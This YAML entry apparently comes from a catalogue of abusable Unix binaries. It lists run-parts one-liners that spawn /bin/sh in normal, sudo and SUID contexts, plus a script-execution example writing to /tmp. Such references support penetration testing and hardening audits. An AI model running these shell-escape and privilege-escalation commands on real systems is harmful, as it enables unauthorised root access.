---
functions:
  shell:
    - code: run-parts --new-session --regex '^sh$' /bin
  sudo:
    - code: sudo run-parts --new-session --regex '^sh$' /bin
  suid:
    - code: ./run-parts --new-session --regex '^sh$' /bin --arg='-p'
  command:
    - description: Execute all executable scripts in a specified directory. In this case, the command runs all scripts in `/tmp/run-parts/`.
      code: |
        mkdir -p /tmp/run-parts/
        printf '#!/bin/sh\n/bin/sh -c "/bin/id > /tmp/id.out"\n' > /tmp/run-parts/id && chmod +x /tmp/run-parts/id
        run-parts /tmp/run-parts
---
